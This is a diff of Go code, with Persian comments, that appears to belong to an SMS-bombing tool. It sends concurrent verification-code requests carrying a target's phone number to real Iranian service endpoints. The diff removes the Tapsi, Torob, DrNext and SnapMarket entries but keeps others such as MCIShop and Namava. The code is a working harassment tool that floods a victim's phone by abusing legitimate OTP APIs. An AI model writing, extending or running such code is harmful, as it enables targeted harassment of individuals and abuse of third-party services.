@@ -347,31 +347,7 @@ cookieJar, _ := cookiejar.New(nil)
 
 
 
-		// تپسی (Tapsi) - POST JSON
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"credential": map[string]interface{}{
-						"phoneNumber": phone, // فرمت 09...
-						"role":        "PASSENGER",
-					},
-				}
-				sendJSONRequest(c, ctx, "https://tap33.me/api/v2/user", payload, &wg, ch)
-			}
-		}(client)
-
-		// تورب (Torob) - GET
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				// ساخت URL با اضافه کردن شماره تلفن به پارامتر query
-				torobURL := fmt.Sprintf("https://api.torob.com/a/phone/send-pin/?phone_number=%s", getPhoneNumberNoZero(phone)) // فرمت 9...
-				sendGETRequest(c, ctx, torobURL, &wg, ch)
-			}
-		}(client)
-
-		// فلایتیو اپ (Flightio App) - POST JSON
+			// فلایتیو اپ (Flightio App) - POST JSON
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -394,18 +370,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// دکتر نکست (DrNext) - POST JSON
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"source": "besina",
-					"mobile": phone, // فرمت 09...
-				}
-				sendJSONRequest(c, ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", payload, &wg, ch)
-			}
-		}(client)
-
 		// ام سی آی شاپ (MCIShop) - POST JSON
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -416,19 +380,6 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://api-ebcom.mci.ir/services/auth/v1.0/otp", payload, &wg, ch)
 			}
 		}(client)
-
-		// اسنپ مارکت (SnapMarket) - POST JSON
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"phone_number": phone, // فرمت 09...
-					"os_type":      "W",
-				}
-				sendJSONRequest(c, ctx, "https://account.api.balad.ir/api/web/auth/login/", payload, &wg, ch)
-			}
-		}(client)
-
 		// نماوا (Namava) - POST Form (بر اساس حدس از کد PHP)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
